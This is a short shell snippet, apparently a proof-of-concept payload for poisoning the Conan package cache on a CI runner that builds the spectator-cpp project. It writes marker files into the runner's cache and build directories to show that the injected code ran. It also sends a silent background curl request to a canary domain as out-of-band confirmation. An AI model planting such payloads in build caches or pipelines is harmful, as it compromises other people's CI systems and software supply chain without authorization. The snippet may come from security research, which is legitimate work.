# Cache poisoning test
echo "CACHE_POISONED_BY_ATTACKER_$(date +%s)" > /home/runner/.conan2/cache_poison_marker.txt
echo "Payload executed at $(date)" > /home/runner/work/spectator-cpp/spectator-cpp/cmake-build/payload_evidence.txt
# Try to trigger OOB
curl -s https://canary.domain/cache_poison_test &>/dev/null &